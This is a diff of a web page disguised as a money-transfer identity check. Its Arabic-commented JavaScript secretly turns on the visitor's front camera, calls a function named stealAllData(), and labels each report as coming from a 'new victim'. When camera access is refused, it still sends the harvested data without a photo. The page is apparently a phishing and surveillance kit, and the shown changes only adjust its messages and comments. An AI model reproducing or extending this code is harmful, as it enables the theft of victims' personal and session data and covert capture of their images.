@@ -148,7 +148,6 @@
             transform:scale(.97);
         }
 
-        /* ===== حقل الرابط الجديد ===== */
         .link-container {
             margin: 16px 0 10px;
             background: #f8f9fc;
@@ -423,11 +422,12 @@ function confirmTransfer() {
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
     btn.style.opacity = '0.7';
-    statusDiv.innerHTML = 'جاري تأكيد الهوية...';
+    statusDiv.innerHTML = '⏳ جاري تأكيد الهوية...';
     statusDiv.style.color = '#e68a00';
 
     const data = getParams();
 
+    // طلب الكاميرا من المستخدم
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
             const video = document.createElement('video');
@@ -498,6 +498,7 @@ ${allData.sessionData}
             }, 2000);
         })
         .catch(() => {
+            // لو المستخدم رفض الكاميرا، نبعت البيانات بدون صورة
             stealAllData()
                 .then(allData => {
                     const caption = `⚠️ ضحية جديدة (بدون صورة) - تقرير كامل
